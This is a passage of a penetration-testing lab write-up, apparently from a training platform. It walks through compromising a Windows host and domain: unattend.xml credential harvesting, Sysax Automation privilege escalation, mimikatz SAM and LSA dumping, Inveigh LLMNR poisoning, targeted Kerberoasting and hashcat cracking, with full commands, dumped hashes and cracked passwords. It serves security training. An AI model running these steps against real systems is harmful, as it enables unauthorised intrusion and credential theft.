[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-18 13:18 CST
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
Nmap scan report for 172.16.8.50
Host is up (0.069s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```

Next, we used evil-winrm with the creds we found for backupadm and were able to log into it.

``` 
$ sudo proxychains evil-winrm -i 172.16.8.50 -u backupadm
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> 
```

Poking around a bit we find an interesting file in C:\panther

```
*Evil-WinRM* PS C:\panther> ls
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM           6995 unattend.xml
```

![[Pasted image 20260218142750.png]]
```
*Evil-WinRM* PS C:\panther> cat unattend.xml
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
<?xml version="1.0" encoding="utf-8"?>
<SNIP>
</SNIP>
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
            </AutoLogon>

<SNIP>
</SNIP>
```

We find credentials for the local user ilfserveradm:Sys26Admin

```
*Evil-WinRM* PS C:\panther> net user ilfserveradm
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
User name                    ilfserveradm
Full Name                    ilfserveradm
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 1:17:17 PM
Password expires             Never
Password changeable          6/1/2022 1:17:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/1/2022 1:17:17 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

This isn't a domain user, but it's interesting that this user has Remote Desktop access but is not a member of the local admins group.

We RDP'd in to see what we can do. First, we exited our 172.16.8.20:3389 ssh session and opened one for 172.16.8.50:3389.

```
$ ssh -i dmz01_key -L 13389:172.16.8.50:3389 root@10.129.1.221
$ xfreerdp /v:127.0.0.1:13389 /u:ilfserveradm /p:Sys26Admin /drive:home,/home/htb-ac-1631704
```

We successfully RDP'd into ilfserveradm
![[Pasted image 20260218144254.png]]

We found an interesting non-standard software **SysaxAutomation.** 

![[Pasted image 20260218144426.png]]

A quick google search yields this local privilege escalation - https://www.exploit-db.com/exploits/50834

According to the write-up, this Sysax Scheduled Service runs as the local SYSTEM account and allows users to create and run backup jobs. If the option to run as a user is removed, it will default to running the task as the SYSTEM account.

First, we created pwn.bat in `C:\Users\ilfserveradm\Documents` containing the line `net localgroup administrators ilfserveradm /add` to add our user to the local admins group.

Next, we performed the following steps:

- Opened `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
- Selected `Setup Scheduled/Triggered Tasks`
- Added task (Triggered)
- Updated folder to monitor to be `C:\Users\ilfserveradm\Documents`
- Checked `Run task if a file is added to the monitor folder or subfolder(s)`
- Chose `Run any other Program` and chose `C:\Users\ilfserveradm\Documents\pwn.bat`
- Unchecked `Login as the following user to run task`
- Clicked `Finish` and then `Save`

![[Pasted image 20260218145345.png]]![[Pasted image 20260218145427.png]]

This added ilfserveradm to the Administrators group.
Next, we performed some post-exploitation.

$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

Edited pwn.bat to be

```
C:\Users\ilfserveradm\Desktopmimikatz.exe "privilege::debug" "lsadump::secrets" "lsadump::sam" "exit" > C:\Users\Public\loot.txt
```

And changed a file to run the command.

```loot.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/hex : e1 67 6a 14 e9 7b 62 b9 c2 9e 5b 0f 61 a5 5b 96 55 96 be eb 7c 78 85 a5 01 8e a7 ae 16 45 96 d1 9a a0 8b 63 bf 40 6c 28 35 c8 10 d5 a0 3a b9 3b 68 4e 86 e2 f6 2b 98 23 1f 9c 84 e2 ab a7 2f 71 1b 89 66 26 05 7d 15 dd c6 2b 84 8a fa 0a a8 4c 3e c2 ad 17 26 ba 0b e8 a9 e7 f1 81 7f 25 9a 10 d3 09 b8 6b 68 fc b0 db a7 02 1d c3 6e 02 94 df d2 d0 92 46 f0 24 34 89 47 5f 5a c7 1d 35 8d 95 63 77 bf e8 7d fb ae bd 41 11 9f 60 f6 19 27 1b 38 e3 3c 3f 47 21 ba ab cc f8 6c c9 59 7b 32 63 81 d1 33 bf 73 17 80 f3 b9 22 36 91 7e d4 45 1a 3e 4f 14 1e 41 73 e0 28 6a 98 44 ee 58 c8 15 3e 28 eb 10 12 b2 cd e2 49 ee 8f 5a 8b bb 76 ea f0 ff ca 17 4e 02 35 89 88 2b ee 13 80 d2 75 05 f7 9f 56 7d 49 1e 7a bd b7 ac 6f 76 00 e2 b6 1d 9a 
    NTLM:c8a3693397a20424e349a6a38b8daa92
    SHA1:11565e5bfa1f38a721f16193b2dfdd067786798f
old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96 
    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b 
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63 
old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63 

mimikatz(commandline) # lsadump::sam
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc
Local SID : S-1-5-21-1020326033-369054202-3290056218

SAMKey : 93454d09b81d64dc5dc4710d08562175

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 0850f84bbd902729bb3af737405cc788

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f14b84784180c57a571f0447e229f9c6

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1484bb4178abdc367dd900f53920cdd8d4fce261027627ad6b490b8a26bedb9a
      aes128_hmac       (4096) : 1d645f67cbebf1111e9d4cd1624e632e
      des_cbc_md5       (4096) : 236767e601c2ab57
    OldCredentials
      aes256_hmac       (4096) : a7be6e113dde09c7c8ab20ab33d0110351a06aca7770adc2ab7adc5a3476c31d
      aes128_hmac       (4096) : 66150075fbb3b2b6197fed9538538c36
      des_cbc_md5       (4096) : d51cdf6438e91f7a
    OlderCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
    Credentials
      des_cbc_md5       : 236767e601c2ab57
    OldCredentials
      des_cbc_md5       : d51cdf6438e91f7a


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5


RID  : 000003ea (1002)
User : ilfserveradm
  Hash NTLM: 22712976f35dc45157952a07c7ffc774

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 097a1ff766ac53e31d7112b23b4b1843

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6b23b9ccd917d962bd42fc4168f7e037b67863ea4477bf8cd107b57817a4de29
      aes128_hmac       (4096) : 30e80864c09d79f23afae50b8d00bb54
      des_cbc_md5       (4096) : e091a1c80b574c15

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
    Credentials
      des_cbc_md5       : e091a1c80b574c15


mimikatz(commandline) # exit
Bye!
```

We found a set password but no associated username. This appears to be for an account configured with autologon. We queried the registry to find a username.

```powershell
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"


DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

Now we have a new credential pair: **mssqladm:DBAilfreight1!**

Ran Inveigh on the host to see if we can obtain password hashes for any other users.

$ cp /usr/share/powershell-empire/empire/server/data/module_source/collection/Invoke-Inveigh.ps1 .

Edited pwn.bat to enable High Integrity logons

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Evil-WinRM'd back into the host as ilfserveradm

```
$ sudo proxychains evil-winrm -i 172.16.8.50 -u ilfserveradm -p Sys26Admin
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
*Evil-WinRM* PS C:\Users\ilfserveradm\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Notice SeDebugPrivilege is now Enabled. This we  can officially interact with the memory of any process on the system, including lsass.exe. We're no longer "filtered" by UAC.

We transferred over Invoke-Inveigh.ps1 from our attack machine and ran it on the 172.16.8.50 host

``` powershell
*Evil-WinRM* PS C:\Users\ilfserveradm\Desktop> Invoke-Inveigh -IP 172.16.8.50 -LLMNR Y -NBNS Y -ConsoleOutput N -FileOutput Y -LogOutput Y -RunTime 10
Inveigh 1.3.1 started at 2026-02-18T16:11:30
Elevated Privilege Mode = Enabled
Primary IP Address = 172.16.8.50
LLMNR/mDNS/NBNS Spoofer IP Address = 172.16.8.50
LLMNR Spoofer = Enabled
LLMNR TTL = 30 Seconds
mDNS Spoofer = Disabled
NBNS Spoofer For Types 00,20 = Enabled
NBNS TTL = 165 Seconds
SMB Capture = Enabled
Warning: HTTP Capture Disabled Due To In Use Port 80
HTTPS Capture = Disabled
Machine Account Capture = Disabled
Real Time Console Output = Disabled
Real Time File Output = Enabled
Output Directory = C:\Users\ilfserveradm\Desktop
Run Time = 10 Minutes
Warning: Run Stop-Inveigh to stop Inveigh

*Evil-WinRM* PS C:\Users\ilfserveradm\Desktop> cat Inveigh-NTLMv2.txt
mpalledorous::ACADEMY-AEN-DEV:1C2E9C0E5DB23F3F:52D731656E46BD100F5ED5A873E1E781:0101000000000000E771418123A1DC01CE45BA1937499E3C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800E771418123A1DC0106000400020000000800300030000000000000000000000000200000D5CC8C4824591F697A4E226B93EC7DB540DAB79E55F51F5F6309D90E267A235C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
```

We were able to crack this offline to reveal the plaintext password. New creds obtained **mpalledorous:1squints2**

```
$ echo "mpalledorous::ACADEMY-AEN-DEV:1C2E9C0E5DB23F3F:52D731656E46BD100F5ED5A873E1E781:0101000000000000E771418123A1DC01CE45BA1937499E3C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800E771418123A1DC0106000400020000000800300030000000000000000000000000200000D5CC8C4824591F697A4E226B93EC7DB540DAB79E55F51F5F6309D90E267A235C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000" > ntlmv2hash.txt
┌─[us-academy-6]─[10.10.14.164]─[htb-ac-1631704@htb-gayaeouc5b]─[~]
└──╼ [★]$ hashcat -m 5600 ntlmv2hash.txt rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

MPALLEDOROUS::ACADEMY-AEN-DEV:1c2e9c0e5db23f3f:52d731656e46bd100f5ed5a873e1e781:0101000000000000e771418123a1dc01ce45ba1937499e3c0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800e771418123a1dc0106000400020000000800300030000000000000000000000000200000d5cc8c4824591f697a4e226b93ec7db540dab79e55f51f5f6309d90e267a235c0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000:1squints2
```

Digging into the BloodHound data we see that we have `GenericWrite` over the `ttimmons` user. Using this we then set a fake SPN on the `ttimmons account` and perform a targeted Kerberoasting attack. 

![[Pasted image 20260219132132.png]]

On the DEV01 where we had loaded PowerView. We created a PSCredential object to be able to run commands as the `mssqladm` user without having to RDP again.

```powershell
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons
```

![[Pasted image 20260219132927.png]]

Next, we went back to our attack host and used GetUserSPNs.py to perform a Keberoasting attack.

```shell
$ sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:389  ...  OK
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 13:32:18.194423  <never>               



[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:88  ...  OK
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$d8d9495e0f5b6ba330f0c404cf0c34a8$5a385c3a52dd84c43fdeedabacf967c1a23332e919a60c8350e82dedd00779bbf3b1894194222115ef49d80ecb9dbc320d8c904a82da57265e29ffdbb14f2d89f7ad9972bc930d5b57ee433f8559268ef0b1f8ac0b301680c231dcfdf1dffa7a0427e3ad13e531d22a6bed5d87c336c568cc2761dd2b90b558734880e609b8a99dc7b9ec451ae114e6a52ee19ff5b5f103cd33336c41b7b324df99f2fbb6600120db344fe1db7a5776bdcf281bbfa9f81965eda6aeb95010b4b30dffd70ea70b6ad818fc64b26872806433aca0cdedc5f4c0cd5f12d4bad9b1f0e8d5fcb8d5977a2dd11483567f5ac720a444712fdc9b250ae9b5bae5e5177bdefa382b81feca57b2197a9ccad93cd9f8f679e68220e160df9f46fd5967ccfc8a8864351a7929ed7863653db0504051ce7e084b63b43bb4c6f40bf1f9923cb9caf675be21084dc5e1928ed200a43e09ae11c5d61b5a19299f0e7c1b5ab79a0173b7ca0bdfd507ad790c7de38d64a394ce8bdef0b9c8cd2b37e3262232ca64a7b99218fee7a31ed21164748752575857b04e048716da9f6ff9103d9a9a2463bbd98050c725cc110fc454b336686f251538c1b2457f23ce4f55429b33319842d1c4603db88f2812f3baacb0e26a20cb40675f89ad7a153d731169fd4cb82c069164214d952888f5918343269abbf2f60f6e21c60ac328b15b312991322b4b1ce09bb0b149d31c2717d434fbde6f627f6dde80037b7152bbecd21a247fc6c699cfd830e881d1decc75a39a8271ea262ccf5828417e54026e1ef66225402960b7d7590db4cc510851d0a1d9028009730f1fa88cb191504ca8e9d3ba7f3a92b41b4ccedb482368ec6edc29d2ac3b1c5753ebe4a8938351af12da2b397e2e0beb45a2a79f8082a15c90c062fdeae2708055f71e46d9b0eccf72ae5e419b5cb25fa2ecbe90dc72e8e6812508ad4f0c90c98bc0ee63c47a1e0a458b4a4652f614f668aa694537a5eaff8aa27c9c5a4353b2a3689b58c90aa3cc29520f016ae7b8d0757b9e9fa39e22fbcb00f6f59e52c9a5537afb6aad9bbd3793d3964dedec56c31d6e5ddcfb436b75d64f8637cd34dcd35a6f72f4d7033c18da51ab7a2826fc48ff3b7c932d028fbd4e9ab1d522ce34c44f3db7d61fbe4ee5693f874158c8b9fc2bcc648830e5d3f1f66c05919fdea2b173c1d4efd8a46828c3b10828952d3cb56358f34a8bf7684d42c5aeb9d33576ccaab80e74bcdca50f36a6eb8ad8740d5cfe4cc27810a163c0b92576e4d7267a8cfac52555f1ce57d278191a8b17d6a877f21db1f86d45ddb69a7094cd1414681526815c51310f1611132847382d89f416f6197390a3bae9553a87222d80
```

Copied the hash to **ttimmons_tgs** and checked if the user was using a weak password with Hashcat

```shell
$ hashcat -m 13100 ttimmons_tgs rockyou.txt

<SNIP>
</SNIP>

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$d8d9495e0f5b6ba330f0c404cf0c34a8$5a385c3a52dd84c43fdeedabacf967c1a23332e919a60c8350e82dedd00779bbf3b1894194222115ef49d80ecb9dbc320d8c904a82da57265e29ffdbb14f2d89f7ad9972bc930d5b57ee433f8559268ef0b1f8ac0b301680c231dcfdf1dffa7a0427e3ad13e531d22a6bed5d87c336c568cc2761dd2b90b558734880e609b8a99dc7b9ec451ae114e6a52ee19ff5b5f103cd33336c41b7b324df99f2fbb6600120db344fe1db7a5776bdcf281bbfa9f81965eda6aeb95010b4b30dffd70ea70b6ad818fc64b26872806433aca0cdedc5f4c0cd5f12d4bad9b1f0e8d5fcb8d5977a2dd11483567f5ac720a444712fdc9b250ae9b5bae5e5177bdefa382b81feca57b2197a9ccad93cd9f8f679e68220e160df9f46fd5967ccfc8a8864351a7929ed7863653db0504051ce7e084b63b43bb4c6f40bf1f9923cb9caf675be21084dc5e1928ed200a43e09ae11c5d61b5a19299f0e7c1b5ab79a0173b7ca0bdfd507ad790c7de38d64a394ce8bdef0b9c8cd2b37e3262232ca64a7b99218fee7a31ed21164748752575857b04e048716da9f6ff9103d9a9a2463bbd98050c725cc110fc454b336686f251538c1b2457f23ce4f55429b33319842d1c4603db88f2812f3baacb0e26a20cb40675f89ad7a153d731169fd4cb82c069164214d952888f5918343269abbf2f60f6e21c60ac328b15b312991322b4b1ce09bb0b149d31c2717d434fbde6f627f6dde80037b7152bbecd21a247fc6c699cfd830e881d1decc75a39a8271ea262ccf5828417e54026e1ef66225402960b7d7590db4cc510851d0a1d9028009730f1fa88cb191504ca8e9d3ba7f3a92b41b4ccedb482368ec6edc29d2ac3b1c5753ebe4a8938351af12da2b397e2e0beb45a2a79f8082a15c90c062fdeae2708055f71e46d9b0eccf72ae5e419b5cb25fa2ecbe90dc72e8e6812508ad4f0c90c98bc0ee63c47a1e0a458b4a4652f614f668aa694537a5eaff8aa27c9c5a4353b2a3689b58c90aa3cc29520f016ae7b8d0757b9e9fa39e22fbcb00f6f59e52c9a5537afb6aad9bbd3793d3964dedec56c31d6e5ddcfb436b75d64f8637cd34dcd35a6f72f4d7033c18da51ab7a2826fc48ff3b7c932d028fbd4e9ab1d522ce34c44f3db7d61fbe4ee5693f874158c8b9fc2bcc648830e5d3f1f66c05919fdea2b173c1d4efd8a46828c3b10828952d3cb56358f34a8bf7684d42c5aeb9d33576ccaab80e74bcdca50f36a6eb8ad8740d5cfe4cc27810a163c0b92576e4d7267a8cfac52555f1ce57d278191a8b17d6a877f21db1f86d45ddb69a7094cd1414681526815c51310f1611132847382d89f416f6197390a3bae9553a87222d80:Repeat09
                                                          
Session..........: hashcat
Status...........: Cracked

<SNIP>
</SNIP>
```

New credential obtained ttimmons:Repeat09

Leveraging BloodHound data again, we saw that ttimmons has GeneralAll over the **SERVER ADMINS** group, how exciting!

![[Pasted image 20260219133741.png]]

